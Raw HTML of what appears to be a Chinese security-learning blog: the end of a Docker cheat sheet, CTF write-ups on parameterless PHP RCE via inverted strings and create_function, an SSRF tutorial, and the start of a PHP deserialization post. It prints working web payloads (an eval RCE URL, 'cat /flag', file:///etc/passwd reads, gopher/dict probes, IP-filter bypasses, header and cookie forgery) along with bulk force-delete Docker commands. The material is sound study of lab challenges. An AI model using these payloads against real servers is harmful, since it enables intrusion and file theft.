class="line">33</span><br></pre></td><td class="code"><pre><span class="line"># 查看docker基础信息</span><br><span class="line">docker info</span><br><span class="line"></span><br><span class="line"># 拉取镜像</span><br><span class="line">docker pull &lt;image&gt;:&lt;tag&gt;</span><br><span class="line"></span><br><span class="line"># 移除容器</span><br><span class="line">docker rm &lt;containerId&gt;</span><br><span class="line"></span><br><span class="line"># 移除镜像</span><br><span class="line">docker rmi &lt;imageId&gt;</span><br><span class="line"></span><br><span class="line"># 启动、停止、重启容器</span><br><span class="line">docker stop &lt;containerId&gt;</span><br><span class="line">docker start &lt;containerId&gt;</span><br><span class="line">docker restart &lt;containerId&gt;</span><br><span class="line">docker run -itd --name &lt;imageName&gt; -P&#x2F;-p&lt;port&gt;:&lt;port&gt; &lt;imageName&gt; &#x2F;bin&#x2F;bash</span><br><span class="line"></span><br><span class="line"># 查看docker容器</span><br><span class="line">docker ps &lt;-a&gt;</span><br><span class="line"></span><br><span class="line"># 打包镜像</span><br><span class="line">docker tag &lt;path&gt;&#x2F;&lt;name&gt; &lt;remotePath&gt;&#x2F;&lt;name&gt;</span><br><span class="line">docker push &lt;remotePath&gt;&#x2F;&lt;name&gt;</span><br><span class="line"></span><br><span class="line"># 登录docker</span><br><span class="line">docker login &lt;remoteIp&gt;</span><br><span class="line"></span><br><span class="line"># 进入容器内部</span><br><span class="line">docker exec -it &lt;containerId&gt; &#x2F;bin&#x2F;bash</span><br><span class="line"></span><br><span class="line"># 从仓库搜索镜像</span><br><span class="line">docker search &lt;imageName&gt;</span><br></pre></td></tr></table></figure>

<h5 id="批量操作"><a href="#批量操作" class="headerlink" title="批量操作"></a>批量操作</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># 杀死所有正在运行的容器</span><br><span class="line">docker kill $(docker ps -a -q)</span><br><span class="line"></span><br><span class="line"># 删除所有的容器</span><br><span class="line">docker rm $(docker ps -a -q)</span><br><span class="line"></span><br><span class="line"># 删除所有未打 dangling 标签的镜</span><br><span class="line">docker rmi $(docker images -q -f dangling&#x3D;true)</span><br><span class="line"></span><br><span class="line"># 删除所有镜像</span><br><span class="line">docker rmi $(docker images -q)</span><br><span class="line">docker rmi $(docker images -q)</span><br><span class="line"></span><br><span class="line"># 强制删除无法删除的镜像</span><br><span class="line">docker rmi -f &lt;imageId&gt;</span><br><span class="line">docker rmi -f $(docker images -q)</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://-181.github.io/2020/12/18/guojingming%E5%92%8Ceasyphp20201216/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/image/avatar.jpg">
      <meta itemprop="name" content="左">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="左">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/12/18/guojingming%E5%92%8Ceasyphp20201216/" class="post-title-link" itemprop="url">guojingming和easyphp20201216</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2020-12-18 00:00:00" itemprop="dateCreated datePublished" datetime="2020-12-18T00:00:00+08:00">2020-12-18</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2020-12-19 21:16:53" itemprop="dateModified" datetime="2020-12-19T21:16:53+08:00">2020-12-19</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="guojingming"><a href="#guojingming" class="headerlink" title="guojingming"></a>guojingming</h2><p>题目源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    $code = $_GET[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($code) &gt; <span class="number">70</span> <span class="keyword">or</span> preg_match(<span class="string">&#x27;/[A-Za-z0-9]|\&#x27;|&quot;|`|\ |,|\.|-|\+|=|\/|\\|&lt;|&gt;|\$|\?|\^|&amp;|\|/is&#x27;</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Your Guojingming&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\s\(\)]+?\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $code))&#123;</span><br><span class="line">        @<span class="keyword">eval</span>($code);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>\：意思是过滤</p>
<p>|：相当于“与”</p>
<p>if语句：大小写字母、数字及许多字符都会被过滤。</p>
<ul>
<li>无参数RCE</li>
</ul>
<p>用getallheaders()函数来读取flag：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo(system(end(getallheaders()))); </span><br></pre></td></tr></table></figure>

<p>但是字母会被过滤，因此需要对这些字母进行取反</p>
<ul>
<li>取反</li>
</ul>
<p>比如system：</p>
<p><img src="https://chen-lishan.gitee.io/tuc/%E9%83%AD%E6%95%AC%E6%98%8E/%E5%8F%96%E5%8F%8D.png"></p>
<p>注：对echo取反需要加上单引号，而其他函数可加可不加</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$a&#x3D;(~&#39;system&#39;);</span><br><span class="line"></span><br><span class="line">echo urlencode($a);</span><br></pre></td></tr></table></figure>

<p>以此类推</p>
<ul>
<li>动态构造函数</li>
</ul>
<p>php二维数组能够构造字符串，如：<code>[&#39;phpinfo&#39;][false] </code>可以构建一个字符串 <code>&quot;phpinfo&quot;</code></p>
<p><img src="https://chen-lishan.gitee.io/tuc/%E9%A2%98%E7%9B%AE/%E5%8A%A8%E6%80%81%E6%9E%84%E9%80%A0.png"></p>
<p>最终输入网址：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.98.234.232:28004&#x2F;?code&#x3D;[~%8F%8D%96%91%8B%A0%8D][!%FF]([~%8C%86%8C%8B%9A%92][!%FF]([~%9A%91%9B][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]())));</span><br></pre></td></tr></table></figure>

<p>PS：~：取反符号</p>
<p>不知为何，抓包后用Burp Suite无法获取flag，于是尝试用HackBar，在Add Header中，输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Upgrade-Insecure-Requests: cat &#x2F;flag</span><br></pre></td></tr></table></figure>

<p>之前做过类似的题，输入的是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat flag.php</span><br></pre></td></tr></table></figure>

<p>而这道题用这个却做不了。flag可以理解为存在于一个文件中，而这道题的flag所在的文件名为flag。一般地，若没有提示，文件名为flag，或者flag.php，可以进行尝试。</p>
<p>刷新页面，可以得到flag：</p>
<p><img src="https://chen-lishan.gitee.io/tuc/%E9%83%AD%E6%95%AC%E6%98%8E/flag.png"></p>
<h2 id="easyphp20201216"><a href="#easyphp20201216" class="headerlink" title="easyphp20201216"></a>easyphp20201216</h2><p>题目源码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">$a &#x3D; create_function(&quot;&quot;, &quot;echo(&#96;cat &#x2F;flag&#96;);&quot;);</span><br><span class="line">if(isset($_GET[&#39;a&#39;]))&#123;</span><br><span class="line">     $_GET[&#39;a&#39;]();</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>

<p>解题思路：先将$a打印出来，然后就可以得到flag。</p>
<p>这里可以看到<code>create_function()</code>这个函数漏洞，它create之后会自动生成函数<code>%00lambda_%d</code></p>
<p>将题目代码复制到Sublime，并加入语句<code>echo $a;</code>运行之后，就可以得到<code>%00lambda_%d</code></p>
<p>每刷新一次，$a的lambda_0后面的数都会加1</p>
<p><img src="https://chen-lishan.gitee.io/tuc/%E9%A2%98%E7%9B%AE/easy2020.png"></p>
<p>输入网址：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.98.234.232:28042&#x2F;?a&#x3D;%00lambda_1</span><br></pre></td></tr></table></figure>

<p>得到flag：</p>
<p><img src="https://chen-lishan.gitee.io/tuc/%E9%A2%98%E7%9B%AE/easy2020%20flag.png"></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://-181.github.io/2020/11/30/SSRF%E6%BC%8F%E6%B4%9E/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/image/avatar.jpg">
      <meta itemprop="name" content="左">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="左">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/11/30/SSRF%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">SSRF漏洞</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2020-11-30 00:00:00 / 修改时间：22:24:20" itemprop="dateCreated datePublished" datetime="2020-11-30T00:00:00+08:00">2020-11-30</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h1><h2 id="关于ssrf的基本概念"><a href="#关于ssrf的基本概念" class="headerlink" title="关于ssrf的基本概念"></a>关于ssrf的基本概念</h2><p>SSRF(Server-Side Request Forgery:服务器端请求伪造)</p>
<p>形成原因大都是由于服务端提供了从其他服务器应用获取数据的功能，但又没有对目标地址做严格过滤与限制，导致攻击者可以传入任意的地址来让后端服务器对其发起请求，并返回对该目标地址请求的数据。</p>
<p>如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.xxx.com&#x2F;ssrf.php?url&#x3D;http:&#x2F;&#x2F;www.abc.com&#x2F;a.jpg</span><br></pre></td></tr></table></figure>

<p>这个URL原本是服务端发起请求获取链接地址的图片数据（读取图片）。</p>
<p>但是代码中没有对一些协议或者IP字符等进行过滤，导致存在SSRF漏洞的话，我们就可以使用一些协议来读取和执行相关命令，如内外网的端口和服务扫描，利用file协议读取本地敏感数据文件等等。</p>
<p>可能出现SSRF的函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents()</span><br><span class="line">curl()</span><br><span class="line">fsocksopen()</span><br><span class="line">fopen()</span><br></pre></td></tr></table></figure>



<p>存在SSRF漏洞的代码：</p>
<p>例：</p>
<p>新建一个n.php的文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function curl($url)&#123;</span><br><span class="line">  &#x2F;&#x2F;创建一个新的curl资源</span><br><span class="line">  $ch &#x3D; curl_init();</span><br><span class="line">  &#x2F;&#x2F;设置URL和相应的选项</span><br><span class="line">  curl_setopt($ch,CURLOPT_URL,$url);</span><br><span class="line">  curl_setopt($ch,CURLOPT_HEADER,false);</span><br><span class="line">  &#x2F;&#x2F;抓取URL并把它传递给浏览器</span><br><span class="line">  curl_exec($ch);</span><br><span class="line">  &#x2F;&#x2F;关闭curl资源，并且释放系统资源</span><br><span class="line">  curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line">$url &#x3D; $_GET[&#39;url&#39;];</span><br><span class="line">curl($url);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>正常来说，url是读取其他网站中的内容，在浏览器输入127.0.0.1/n.php，可以读取文件内容。而如果我们传入以下内容，就可以读取服务器上的信息：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;n.php?url&#x3D;file:&#x2F;&#x2F;&#x2F;C:&#x2F;WINDOWS&#x2F;win.ini</span><br></pre></td></tr></table></figure>

<p><img src="https://chen-lishan.gitee.io/tuc/2.png"></p>
<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/n.php.png"></p>
<p>使用一些协议来读取和执行相关命令，如</p>
<p>http协议：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;ssrf.php?url&#x3D;http:&#x2F;&#x2F;127.0.0.1:1314</span><br></pre></td></tr></table></figure>

<p>dict协议：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.xxx.com&#x2F;ssrf.php?url&#x3D;http:&#x2F;&#x2F;127.0.0.1:22</span><br><span class="line">http:&#x2F;&#x2F;www.xxx.com&#x2F;ssrf.php?url&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</span><br><span class="line">http:&#x2F;&#x2F;www.xxx.com&#x2F;ssrf.php?url&#x3D;dict:&#x2F;&#x2F;127.0.0.1:22&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;www.xxx.com&#x2F;ssrf.php?url&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:2233&#x2F;_test</span><br></pre></td></tr></table></figure>

<p>因此，服务器往往会对接收进来的参数进行过滤，或者禁止不常用的协议，禁用IP等。那么我们就要去绕过它。</p>
<h2 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h2><h3 id="不存在协议头绕过"><a href="#不存在协议头绕过" class="headerlink" title="不存在协议头绕过"></a>不存在协议头绕过</h3><p>当PHP的 <code>file_get_contents()</code> 遇到不认识的伪协议头时，会将伪协议头当做文件夹，造成目录穿越漏洞，因此只需不断往上跳转目录即可读到根目录的文件。</p>
<p>题目源码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(!preg_match(&#39;&#x2F;^http&#x2F;is&#39;, $_GET[&#39;a&#39;]))&#123;</span><br><span class="line">      die(&quot;no hack&quot;);&#x2F;&#x2F;必须匹配到一个http，否则就会die掉</span><br><span class="line">   &#125;</span><br><span class="line">echo file_get_contents($_GET[&#39;a&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>要匹配到http，在http后面加上abc，使php识别不了这个httpabc协议</p>
<p>输入网址：</p>
<p>（PHP黑魔法：当协议在php中找不到，就可以解析成一个目录，绕过这个性质，读取到flag）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;39.107.126.173:28763&#x2F;?a&#x3D;httpabc:&#x2F;&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag</span><br></pre></td></tr></table></figure>



<h3 id="IP限制绕过"><a href="#IP限制绕过" class="headerlink" title="IP限制绕过"></a>IP限制绕过</h3><p>如果IP被限制，拒绝某个IP进行访问，但是只有这个ip访问才能得到ﬂag，这种情况可以使用多种绕过方法。 </p>
<h4 id="回环地址绕过"><a href="#回环地址绕过" class="headerlink" title="回环地址绕过"></a>回环地址绕过</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(!preg_match(&#39;&#x2F;^(http:\&#x2F;\&#x2F;)?([^\&#x2F;]+)&#x2F;is&#39;, $_GET[&#39;a&#39;]))&#123;</span><br><span class="line">      die(&quot;no hack&quot;);</span><br><span class="line">   &#125;else&#123;</span><br><span class="line">           echo file_get_contents($_GET[&#39;a&#39;]);</span><br><span class="line">       &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>输入网址：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;39.107.126.173:28284&#x2F;?a&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;flag.php</span><br></pre></td></tr></table></figure>



<h4 id="localhost"><a href="#localhost" class="headerlink" title="localhost"></a>localhost</h4><p>禁止127.0.0.1访问，可以用localhost代替127.0.0.1绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(!preg_match(&#39;&#x2F;^(http:\&#x2F;\&#x2F;)?([^\&#x2F;]+)&#x2F;is&#39;, $_GET[&#39;a&#39;]))&#123;</span><br><span class="line">      die(&quot;no hack&quot;);</span><br><span class="line">   &#125;</span><br><span class="line">if(preg_match(&#39;&#x2F;^http:\&#x2F;\&#x2F;127\.0\.0\.1&#x2F;&#39;, $_GET[&#39;a&#39;]))&#123;</span><br><span class="line">            die(&quot;no hack&quot;);&#x2F;&#x2F;若用127.0.0.1，就会die掉</span><br><span class="line">&#125;else&#123;</span><br><span class="line">        echo file_get_contents($_GET[&#39;a&#39;]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>输入网址：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;39.107.126.173:28149&#x2F;?a&#x3D;http:&#x2F;&#x2F;localhost&#x2F;flag.php</span><br></pre></td></tr></table></figure>

<h4 id="特殊IP绕过IP限制"><a href="#特殊IP绕过IP限制" class="headerlink" title="特殊IP绕过IP限制"></a>特殊IP绕过IP限制</h4><p>127.0.0.1的八进制表示为017700000001</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;39.107.126.173:28674&#x2F;?a&#x3D;http:&#x2F;&#x2F;017700000001&#x2F;flag.php</span><br></pre></td></tr></table></figure>





<h3 id="Curl造成的SSRF"><a href="#Curl造成的SSRF" class="headerlink" title="Curl造成的SSRF"></a>Curl造成的SSRF</h3><h5 id="双url绕过"><a href="#双url绕过" class="headerlink" title="双url绕过"></a>双url绕过</h5><p>由于一次GET传输会先进行URL解码，而SSRF同样支持url解码，因此可以使用双url编码。</p>
<p>题目源码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$b &#x3D; strpos($_GET[&#39;a&#39;], &#39;flag&#39;);</span><br><span class="line">if($b) &#123;</span><br><span class="line">    die(&quot;Bye!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">$c &#x3D; curl_init();&#x2F;&#x2F;初始化</span><br><span class="line">curl_setopt($c, CURLOPT_URL, $_GET[&#39;a&#39;]);&#x2F;&#x2F;设置url</span><br><span class="line">curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);&#x2F;&#x2F;获取页面neural</span><br><span class="line">curl_setopt($c, CURLOPT_CONNECTTIMEOUT, 5);&#x2F;&#x2F;设置超时</span><br><span class="line">echo curl_exec($c);&#x2F;&#x2F;执行curl</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>以上，strpos：查找字符串第一次出现的位置，注意字符串位置从 0 开始，也就是说，flag这个字符串被禁用掉了（if语句：如果传参有flag，就会die掉）。</p>
<p>解决方法：对flag进行二次编码：把a双url编码为%25%36%31，输入到浏览器里会变成%2561，其实是一样的。（在Burp Suite中，点击上方的Decoder，在方框中输入a，点击右侧的Encode，再点击URL，然后将编码后的字符复制，再编码一次，即可得到二次编码）</p>
<p><img src="https://chen-lishan.gitee.io/tuc/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20201130221514.png"></p>
<p>输入网址：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;39.107.126.173:28577&#x2F;?a&#x3D;file:&#x2F;&#x2F;&#x2F;fl%25%36%31g</span><br></pre></td></tr></table></figure>





<h3 id="X-Forwarded-For绕过、Cookie伪造"><a href="#X-Forwarded-For绕过、Cookie伪造" class="headerlink" title="X-Forwarded-For绕过、Cookie伪造"></a>X-Forwarded-For绕过、Cookie伪造</h3><p>题目源码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">setcookie(&quot;user&quot;, &quot;0&quot;, time()+360);</span><br><span class="line">if(@$_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;]!&#x3D;&quot;127.0.0.1&quot;)&#123;</span><br><span class="line">   die(&quot;You are not on the intranet&quot;);&#x2F;&#x2F;如果!&#x3D;&quot;127.0.0.1&quot;，就会die掉</span><br><span class="line">&#125;else&#123;</span><br><span class="line"> if($_COOKIE[&#39;user&#39;]&#x3D;&#x3D;1)&#123;</span><br><span class="line">   echo file_get_contents(&#39;&#x2F;flag&#39;);</span><br><span class="line">   &#125;else&#123;</span><br><span class="line">        die(&quot;u no admin!&quot;);</span><br><span class="line">    &#125;&#x2F;&#x2F;如果user！&#x3D;1，就会die掉</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>抓包，将user=0改为user=1，添加X-Forwarded-For:127.0.0.1，即可得到flag。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 39.107.126.173:28989</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko&#x2F;20100101 Firefox&#x2F;78.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: user&#x3D;1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">X-Forwarded-For:127.0.0.1</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://-181.github.io/2020/11/27/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/image/avatar.jpg">
      <meta itemprop="name" content="左">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="左">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/11/27/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">PHP反序列化漏洞</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2020-11-27 00:00:00" itemprop="dateCreated datePublished" datetime="2020-11-27T00:00:00+08:00">2020-11-27</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2020-12-11 19:33:25" itemprop="dateModified" datetime="2020-12-11T19:33:25+08:00">2020-12-11</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="PHP反序列化漏洞"></a>PHP反序列化漏洞</h1><blockquote>
<p>所有php里面的值都可以使用函数serialize()来返回一个包含字节流的字符串来表示。unserialize()函数能够重新把字符串变回php原来的值。 序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。 ——php官方文档</p>
</blockquote>
<p>serialize可以将一个对象（变量）转换成可以传输的字符串，并且在转换的过程中可以保存当前变量的值；而unserialize可以将serialize生成的字符串再转换回变量。</p>
<h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><p>举个例子：</p>
